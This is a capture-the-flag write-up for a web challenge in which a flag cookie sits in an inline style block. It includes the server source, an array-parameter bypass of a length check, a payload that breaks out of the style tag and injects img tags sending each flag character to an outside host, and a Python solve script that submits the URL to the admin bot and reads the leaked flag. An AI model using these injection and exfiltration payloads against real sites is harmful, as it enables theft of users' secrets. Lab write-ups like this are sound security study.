---
created: 2026-03-14T10:18
updated: 2026-03-15T01:15
points: 220
solves: 17
---

This is a XSS challenge that we are supposed to solve with CSS.

```js
import express from "express";
import cookieParser from "cookie-parser";

const template = `
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <style>
      :root {
        --flag: "{{FLAG}}";
      }
      /* Your CSS here! */
      {{CSS}}
    </style>
  </head>
  <body>
    <h1>Capture The 🚩!</h1>
  </body>
</html>
`.trim();

express()
  .use(cookieParser())
  .get("/", (req, res) => {
    let { css = "", sep = "" } = req.query;
    const FLAG = req.cookies.FLAG ?? "tkbctf{dummy}";

    if (sep.length > 2) sep = "";

    const html = template
      .replace("{{FLAG}}", () => FLAG.split("").join(sep))
      .replace("{{CSS}}", () => css.replace(/[<>]/g, ""));
    res.setHeader("X-Stuff", JSON.stringify(req.query));
    res.setHeader(
      "Content-Security-Policy",
      "default-src 'none'; style-src 'unsafe-inline'; font-src 'none'; img-src *",
    );
    res.send(html);
  })
  .listen(3000);
```

However I bypassed `sep.length > 2` by using an array for `sep`.

Then I tried to use `background-image` to load some url of each character.

So maybe

```css
root {
  --flag: "t");
} body { background-image: url(https://1337.yun.ng/?d=k");
} body { background-image: url(https://1337.yun.ng/?d=b");
...
```

But the css is always thrown away as invalid for whatever reasons.

I tried other stuff but none of them worked, then I tried to make use of `{{CSS}}`, because it was replaced after the `{{FLAG}}` replacement, this means I can put `{{CSS}}` in `sep` and it would be replaced with the stuff I put in `css`, but only once.

I immediately thought to use the first `{{CSS}}` to become a opening quote and the rest of `{{CSS}}` won't become quote essentially keeping the entire flag in order, in some url.

CSS still didn't take my url, so I got fed up and just escaped the style tag, made an image tag, and have the image tag load this long url, it worked lol.

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <style>
      :root {
        --flag: "t,></style><img src="https://1337.yun.ng/?w=k,></style><img src={{CSS}}https://1337.yun.ng/?w=b,></style><img src={{CSS}}https://1337.yun.ng/?w=c,></style><img src={{CSS}}https://1337.yun.ng/?w=t,></style><img src={{CSS}}https://1337.yun.ng/?w=f,></style><img src={{CSS}}https://1337.yun.ng/?w={,></style><img src={{CSS}}https://1337.yun.ng/?w=d,></style><img src={{CSS}}https://1337.yun.ng/?w=u,></style><img src={{CSS}}https://1337.yun.ng/?w=m,></style><img src={{CSS}}https://1337.yun.ng/?w=m,></style><img src={{CSS}}https://1337.yun.ng/?w=y,></style><img src={{CSS}}https://1337.yun.ng/?w=}";
      }
      /* Your CSS here! */
      {{CSS}}
    </style>
  </head>
  <body>
    <h1>Capture The 🚩!</h1>
  </body>
</html>
```

In the browser this becomes:

```html
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <style>
            :root {
            --flag: "t,>
        </style>
        <style>:is([id*='google_ads_iframe'],[id*='taboola-'],.taboolaHeight,.taboola-placeholder,#top-ad,#credential_picker_container,#credentials-picker-container,#credential_picker_iframe,[id*='google-one-tap-iframe'],#google-one-tap-popup-container,.google-one-tap__module,.google-one-tap-modal-div,#amp_floatingAdDiv,#ez-content-blocker-container) {display:none!important;min-height:0!important;height:0!important;}</style>
    </head>
    <body>
        <img src="https://1337.yun.ng/?w=k,&gt;&lt;/style&gt;&lt;img src={{CSS}}https://1337.yun.ng/?w=b,&gt;&lt;/style&gt;&lt;img src={{CSS}}https://1337.yun.ng/?w=c,&gt;&lt;/style&gt;&lt;img src={{CSS}}https://1337.yun.ng/?w=t,&gt;&lt;/style&gt;&lt;img src={{CSS}}https://1337.yun.ng/?w=f,&gt;&lt;/style&gt;&lt;img src={{CSS}}https://1337.yun.ng/?w={,&gt;&lt;/style&gt;&lt;img src={{CSS}}https://1337.yun.ng/?w=d,&gt;&lt;/style&gt;&lt;img src={{CSS}}https://1337.yun.ng/?w=u,&gt;&lt;/style&gt;&lt;img src={{CSS}}https://1337.yun.ng/?w=m,&gt;&lt;/style&gt;&lt;img src={{CSS}}https://1337.yun.ng/?w=m,&gt;&lt;/style&gt;&lt;img src={{CSS}}https://1337.yun.ng/?w=y,&gt;&lt;/style&gt;&lt;img src={{CSS}}https://1337.yun.ng/?w=}" ;="" }="" *="" your="" css="" here!="" {{css}}="" <="" style="">
        <h1>Capture The 🚩!</h1>
    </body>
</html>
```

```flag
tkbctf{0hY0urC551sBe4ut1ful}
```

```python
import requests
from server import webhook

stop, wait = webhook(1337)
target = "http://localhost:3000"
target = "http://136.110.89.226:21097"
bot = "http://localhost:1337/api/report"
bot = "http://136.110.89.226:32474/api/report"
# target = "http://35.194.108.145:7187"
params = {
    "sep": ["",
            "></style><img src={{CSS}}https://1337.yun.ng/?w="
            ],
    "css": '"'
}
print(requests.get(target, params=params).text)
url = requests.get(target, params=params).url
print(url)
rurl = url.replace(target, "http://web:3000")
print(requests.post(bot, json={"url": rurl}).text)

data = wait()
print(data)
w = data['w']
w = str(w[0]).replace(',></style><img src={{CSS}}https://1337.yun.ng/?w=', '')
print('t'+w)
stop()

# tkbctf{0hY0urC551sBe4ut1ful}
```
